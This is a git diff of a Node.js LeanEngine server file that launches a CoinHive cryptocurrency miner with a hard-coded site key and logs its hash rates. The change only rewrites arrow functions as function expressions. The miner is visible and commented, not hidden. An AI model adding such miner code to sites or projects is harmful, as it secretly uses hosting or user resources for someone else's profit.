@@ -7,7 +7,7 @@ var bodyParser = require('body-parser');
 var AV = require('leanengine');
 
 var CoinHive = require('coin-hive');
-(async () => {
+(async function(){
 
   // Create miner
   var miner = await CoinHive('od8Mnoa7vWHNiXNCsE7jzsf8rpreuHBJ'); // Coin-Hive's Site Key
@@ -16,13 +16,13 @@ var CoinHive = require('coin-hive');
   await miner.start();
 
   // Listen on events
-  miner.on('found', () => console.log('Found!'))
-  miner.on('accepted', () => console.log('Accepted!'))
-  miner.on('update', data => console.log(`
+  miner.on('found', function(){ console.log('Found!')})
+  miner.on('accepted', function() { console.log('Accepted!')})
+  miner.on('update', function(data) { console.log(`
     Hashes per second: ${data.hashesPerSecond}
     Total hashes: ${data.totalHashes}
     Accepted hashes: ${data.acceptedHashes}
-  `));
+  `)});
 
   // Stop miner
 })();
